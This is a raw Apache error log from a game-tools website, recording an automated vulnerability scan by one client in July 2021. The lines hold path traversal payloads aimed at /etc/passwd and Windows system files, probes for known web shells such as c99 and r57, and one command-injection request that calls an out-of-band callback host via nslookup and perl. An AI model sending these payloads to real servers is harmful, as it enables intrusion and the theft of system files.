[Wed Jul 07 19:32:38.264738 2021] [php7:error] [pid 15308] [client 27.147.202.214:2087] script '/var/www/html/h3.warframetools.com/js/r.php' not found or unable to stat
[Wed Jul 07 19:32:38.418358 2021] [php7:error] [pid 15643] [client 27.147.202.214:3603] script '/var/www/html/h3.warframetools.com/xmlrpc-server.php' not found or unable to stat
[Wed Jul 07 19:32:38.549076 2021] [php7:error] [pid 15308] [client 27.147.202.214:2087] script '/var/www/html/h3.warframetools.com/js/lol.php' not found or unable to stat
[Wed Jul 07 19:32:38.770159 2021] [core:error] [pid 15504] [client 27.147.202.214:13331] AH00126: Invalid URI in request GET /css//../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:32:38.833113 2021] [php7:error] [pid 15308] [client 27.147.202.214:2087] script '/var/www/html/h3.warframetools.com/js/zehir.php' not found or unable to stat
[Wed Jul 07 19:32:39.004921 2021] [php7:error] [pid 15643] [client 27.147.202.214:3603] script '/var/www/html/h3.warframetools.com/xmlrpc_server.php' not found or unable to stat
[Wed Jul 07 19:32:39.117558 2021] [php7:error] [pid 15308] [client 27.147.202.214:2087] script '/var/www/html/h3.warframetools.com/js/c-h.v2.php' not found or unable to stat
[Wed Jul 07 19:32:39.351781 2021] [core:error] [pid 15445] [client 27.147.202.214:2075] AH00126: Invalid URI in request GET /css//../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:32:39.408588 2021] [php7:error] [pid 15308] [client 27.147.202.214:2087] script '/var/www/html/h3.warframetools.com/js/php-backdoor.php' not found or unable to stat
[Wed Jul 07 19:32:39.420135 2021] [php7:error] [pid 15302] [client 27.147.202.214:2086] script '/var/www/html/h3.warframetools.com/restserver.php' not found or unable to stat
[Wed Jul 07 19:32:39.633324 2021] [php7:error] [pid 15643] [client 27.147.202.214:3603] script '/var/www/html/h3.warframetools.com/xmlrpc_server.php' not found or unable to stat
[Wed Jul 07 19:32:39.677554 2021] [core:error] [pid 15451] [client 27.147.202.214:2089] AH00126: Invalid URI in request GET /css//../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:32:39.692042 2021] [php7:error] [pid 15308] [client 27.147.202.214:2087] script '/var/www/html/h3.warframetools.com/js/simple-backdoor.php' not found or unable to stat
[Wed Jul 07 19:32:40.261386 2021] [php7:error] [pid 15643] [client 27.147.202.214:3603] script '/var/www/html/h3.warframetools.com/xmlrpc_server.php' not found or unable to stat
[Wed Jul 07 19:32:40.500162 2021] [core:error] [pid 15260] [client 27.147.202.214:2065] AH00126: Invalid URI in request GET /css//../../../../../../../../boot.ini HTTP/1.1
[Wed Jul 07 19:32:40.929497 2021] [php7:error] [pid 15643] [client 27.147.202.214:3603] script '/var/www/html/h3.warframetools.com/xmlrpc_server.php' not found or unable to stat
[Wed Jul 07 19:32:41.666883 2021] [core:error] [pid 15640] [client 27.147.202.214:3604] AH00126: Invalid URI in request GET /js//../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:32:43.660916 2021] [core:error] [pid 15314] [client 27.147.202.214:13576] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Wed Jul 07 19:32:44.233559 2021] [core:error] [pid 15473] [client 27.147.202.214:2073] AH00126: Invalid URI in request GET /js//../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:32:44.666829 2021] [core:error] [pid 14331] [client 27.147.202.214:13013] AH00126: Invalid URI in request GET /js//../../../../../../../../boot.ini HTTP/1.1
[Wed Jul 07 19:32:44.795572 2021] [core:error] [pid 15667] [client 27.147.202.214:13188] AH00126: Invalid URI in request GET /css//../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:32:44.880320 2021] [core:error] [pid 15642] [client 27.147.202.214:3602] AH00126: Invalid URI in request GET /js//../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:32:45.857520 2021] [core:error] [pid 15309] [client 27.147.202.214:9587] AH00126: Invalid URI in request GET /css//../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:32:45.893258 2021] [core:error] [pid 15476] [client 27.147.202.214:7421] AH00126: Invalid URI in request GET /js//../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:32:46.080929 2021] [core:error] [pid 15641] [client 27.147.202.214:2167] AH00126: Invalid URI in request GET /css//../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:32:46.626959 2021] [php7:error] [pid 15478] [client 27.147.202.214:2162] script '/var/www/html/h3.warframetools.com/css/apc.php' not found or unable to stat
[Wed Jul 07 19:32:47.372222 2021] [core:error] [pid 15255] [client 27.147.202.214:3605] AH00126: Invalid URI in request GET /css//../../../../../../../../boot.ini HTTP/1.1
[Wed Jul 07 19:32:47.397588 2021] [core:error] [pid 15021] [client 27.147.202.214:13109] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Wed Jul 07 19:32:47.706889 2021] [core:error] [pid 14331] [client 27.147.202.214:9539] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Wed Jul 07 19:32:47.795323 2021] [core:error] [pid 15710] [client 27.147.202.214:8641] AH00126: Invalid URI in request GET /css//../../../../../../../../boot.ini HTTP/1.1
[Wed Jul 07 19:32:49.175968 2021] [core:error] [pid 15629] [client 27.147.202.214:2170] AH00126: Invalid URI in request GET /js//../../../../../../../../boot.ini HTTP/1.1
[Wed Jul 07 19:32:49.760686 2021] [authz_core:error] [pid 15498] [client 27.147.202.214:8664] AH01630: client denied by server configuration: /var/www/html/h3.warframetools.com/css/.htaccess
[Wed Jul 07 19:32:50.150384 2021] [php7:error] [pid 15302] [client 27.147.202.214:2086] script '/var/www/html/h3.warframetools.com/rsrc.php' not found or unable to stat
[Wed Jul 07 19:32:50.479920 2021] [php7:error] [pid 15473] [client 27.147.202.214:13098] script '/var/www/html/h3.warframetools.com/css/phpinfo.php' not found or unable to stat
[Wed Jul 07 19:32:50.751664 2021] [php7:error] [pid 15498] [client 27.147.202.214:8664] script '/var/www/html/h3.warframetools.com/css/r57shell.php' not found or unable to stat
[Wed Jul 07 19:32:51.009048 2021] [php7:error] [pid 14375] [client 27.147.202.214:13573] script '/var/www/html/h3.warframetools.com/css/webadmin.php' not found or unable to stat
[Wed Jul 07 19:32:51.130112 2021] [php7:error] [pid 15473] [client 27.147.202.214:13098] script '/var/www/html/h3.warframetools.com/css/pi.php' not found or unable to stat
[Wed Jul 07 19:32:51.366717 2021] [core:error] [pid 15461] [client 27.147.202.214:2080] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Wed Jul 07 19:32:51.691498 2021] [core:error] [pid 14375] [client 27.147.202.214:13573] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Wed Jul 07 19:32:51.704075 2021] [php7:error] [pid 15498] [client 27.147.202.214:8664] script '/var/www/html/h3.warframetools.com/css/r57.php' not found or unable to stat
[Wed Jul 07 19:32:51.811390 2021] [php7:error] [pid 15667] [client 27.147.202.214:9594] script '/var/www/html/h3.warframetools.com/css/php.php' not found or unable to stat
[Wed Jul 07 19:32:52.027554 2021] [php7:error] [pid 15498] [client 27.147.202.214:8664] script '/var/www/html/h3.warframetools.com/css/r58.php' not found or unable to stat
[Wed Jul 07 19:32:52.136798 2021] [php7:error] [pid 15641] [client 27.147.202.214:8648] script '/var/www/html/h3.warframetools.com/css/i.php' not found or unable to stat
[Wed Jul 07 19:32:52.351169 2021] [php7:error] [pid 15498] [client 27.147.202.214:8664] script '/var/www/html/h3.warframetools.com/css/c99shell.php' not found or unable to stat
[Wed Jul 07 19:32:52.449394 2021] [php7:error] [pid 15641] [client 27.147.202.214:8648] script '/var/www/html/h3.warframetools.com/css/test.php' not found or unable to stat
[Wed Jul 07 19:32:52.525521 2021] [core:error] [pid 15309] [client 27.147.202.214:8651] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Wed Jul 07 19:32:52.678278 2021] [core:error] [pid 15665] [client 27.147.202.214:7598] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Wed Jul 07 19:32:52.680160 2021] [php7:error] [pid 15498] [client 27.147.202.214:8664] script '/var/www/html/h3.warframetools.com/css/c99.php' not found or unable to stat
[Wed Jul 07 19:32:52.774292 2021] [php7:error] [pid 15641] [client 27.147.202.214:8648] script '/var/www/html/h3.warframetools.com/css/temp.php' not found or unable to stat
[Wed Jul 07 19:32:52.839346 2021] [core:error] [pid 15460] [client 27.147.202.214:13148] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Wed Jul 07 19:32:52.972270 2021] [core:error] [pid 15443] [client 27.147.202.214:13363] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Wed Jul 07 19:32:52.979633 2021] [php7:error] [pid 15498] [client 27.147.202.214:8664] script '/var/www/html/h3.warframetools.com/css/nstview.php' not found or unable to stat
[Wed Jul 07 19:32:53.086572 2021] [core:error] [pid 14342] [client 27.147.202.214:2062] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Wed Jul 07 19:32:53.090837 2021] [php7:error] [pid 15641] [client 27.147.202.214:8648] script '/var/www/html/h3.warframetools.com/css/info.php' not found or unable to stat
[Wed Jul 07 19:32:53.261980 2021] [core:error] [pid 15671] [client 27.147.202.214:6905] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Wed Jul 07 19:32:53.882708 2021] [php7:error] [pid 15498] [client 27.147.202.214:8664] script '/var/www/html/h3.warframetools.com/css/nst.php' not found or unable to stat
[Wed Jul 07 19:32:53.932141 2021] [core:error] [pid 15458] [client 27.147.202.214:8644] AH00126: Invalid URI in request GET /js//../../../../../../../../boot.ini HTTP/1.1
[Wed Jul 07 19:32:54.214357 2021] [php7:error] [pid 15498] [client 27.147.202.214:8664] script '/var/www/html/h3.warframetools.com/css/rst.php' not found or unable to stat
[Wed Jul 07 19:32:54.497314 2021] [core:error] [pid 15646] (36)File name too long: [client 27.147.202.214:3606] AH00036: access to /js/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/var/www/html/h3.warframetools.com/js/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Wed Jul 07 19:32:54.544788 2021] [php7:error] [pid 15498] [client 27.147.202.214:8664] script '/var/www/html/h3.warframetools.com/css/r57eng.php' not found or unable to stat
[Wed Jul 07 19:32:54.588408 2021] [core:error] [pid 15633] (36)File name too long: [client 27.147.202.214:8649] AH00036: access to /js/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/var/www/html/h3.warframetools.com/js/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Wed Jul 07 19:32:54.857609 2021] [php7:error] [pid 15498] [client 27.147.202.214:8664] script '/var/www/html/h3.warframetools.com/css/shell.php' not found or unable to stat
[Wed Jul 07 19:32:55.039253 2021] [core:error] [pid 15745] (36)File name too long: [client 27.147.202.214:8645] AH00036: access to /js/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/var/www/html/h3.warframetools.com/js/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Wed Jul 07 19:32:55.194182 2021] [php7:error] [pid 15498] [client 27.147.202.214:8664] script '/var/www/html/h3.warframetools.com/css/dra.php' not found or unable to stat
[Wed Jul 07 19:32:55.236158 2021] [core:error] [pid 15314] [client 27.147.202.214:9738] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Wed Jul 07 19:32:55.524652 2021] [php7:error] [pid 15498] [client 27.147.202.214:8664] script '/var/www/html/h3.warframetools.com/css/r.php' not found or unable to stat
[Wed Jul 07 19:32:55.938515 2021] [core:error] [pid 15667] (36)File name too long: [client 27.147.202.214:9594] AH00036: access to /css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/var/www/html/h3.warframetools.com/css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Wed Jul 07 19:32:55.993321 2021] [core:error] [pid 15455] [client 27.147.202.214:11392] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Wed Jul 07 19:32:56.408081 2021] [php7:error] [pid 15498] [client 27.147.202.214:8664] script '/var/www/html/h3.warframetools.com/css/lol.php' not found or unable to stat
[Wed Jul 07 19:32:56.705663 2021] [php7:error] [pid 15498] [client 27.147.202.214:8664] script '/var/www/html/h3.warframetools.com/css/zehir.php' not found or unable to stat
[Wed Jul 07 19:32:57.421254 2021] [core:error] [pid 15504] (36)File name too long: [client 27.147.202.214:8652] AH00036: access to /js/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/var/www/html/h3.warframetools.com/js/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Wed Jul 07 19:32:58.136585 2021] [php7:error] [pid 15498] [client 27.147.202.214:8664] script '/var/www/html/h3.warframetools.com/css/c-h.v2.php' not found or unable to stat
[Wed Jul 07 19:32:58.470385 2021] [php7:error] [pid 15774] [client 27.147.202.214:8746] script '/var/www/html/h3.warframetools.com/css/php-backdoor.php' not found or unable to stat
[Wed Jul 07 19:32:58.790666 2021] [php7:error] [pid 15673] [client 27.147.202.214:13219] script '/var/www/html/h3.warframetools.com/css/simple-backdoor.php' not found or unable to stat
[Wed Jul 07 19:32:59.389564 2021] [core:error] [pid 15642] (36)File name too long: [client 27.147.202.214:9301] AH00036: access to /;(nslookup hitkecmramvdse089e.bxss.me||perl -e "gethostbyname('hitkecmramvdse089e.bxss.me')")|(nslookup hitkecmramvdse089e.bxss.me||perl -e "gethostbyname('hitkecmramvdse089e.bxss.me')")&(nslookup hitkecmramvdse089e.bxss.me||perl -e "gethostbyname('hitkecmramvdse089e.bxss.me')")/app.js failed (filesystem path '/var/www/html/h3.warframetools.com/;(nslookup hitkecmramvdse089e.bxss.me||perl -e "gethostbyname('hitkecmramvdse089e.bxss.me')")|(nslookup hitkecmramvdse089e.bxss.me||perl -e "gethostbyname('hitkecmramvdse089e.bxss.me')")&(nslookup hitkecmramvdse089e.bxss.me||perl -e "gethostbyname('hitkecmramvdse089e.bxss.me')")')
[Wed Jul 07 19:32:59.493348 2021] [core:error] [pid 15480] [client 27.147.202.214:8749] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Wed Jul 07 19:32:59.820797 2021] [core:error] [pid 15308] [client 27.147.202.214:2087] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Wed Jul 07 19:33:00.562814 2021] [core:error] [pid 15315] (36)File name too long: [client 27.147.202.214:8647] AH00036: access to /css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/var/www/html/h3.warframetools.com/css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Wed Jul 07 19:33:00.767496 2021] [php7:error] [pid 15659] [client 27.147.202.214:9731] script '/var/www/html/h3.warframetools.com/js/apc.php' not found or unable to stat
[Wed Jul 07 19:33:01.932256 2021] [core:error] [pid 15641] (36)File name too long: [client 27.147.202.214:8648] AH00036: access to /css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/var/www/html/h3.warframetools.com/css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Wed Jul 07 19:33:02.035997 2021] [authz_core:error] [pid 15642] [client 27.147.202.214:9301] AH01630: client denied by server configuration: /var/www/html/h3.warframetools.com/js/.htaccess
[Wed Jul 07 19:33:02.896353 2021] [php7:error] [pid 15659] [client 27.147.202.214:9731] script '/var/www/html/h3.warframetools.com/js/phpinfo.php' not found or unable to stat
